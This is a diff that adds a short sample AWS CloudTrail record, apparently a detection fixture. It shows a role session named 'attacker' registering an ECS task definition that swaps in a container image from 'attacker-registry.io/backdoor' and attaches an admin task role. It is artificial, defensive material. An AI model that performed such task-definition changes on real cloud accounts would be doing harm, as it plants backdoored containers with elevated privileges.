@@ -1,0 +1,23 @@
+{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::123456789012:assumed-role/DevRole/attacker"
+  },
+  "eventTime": "2024-04-10T09:15:22Z",
+  "eventSource": "ecs.amazonaws.com",
+  "eventName": "RegisterTaskDefinition",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "family": "web-app",
+    "containerDefinitions": [
+      {
+        "name": "app",
+        "image": "attacker-registry.io/backdoor:latest",
+        "essential": true
+      }
+    ],
+    "taskRoleArn": "arn:aws:iam::123456789012:role/ECSTaskAdminRole"
+  }
+}
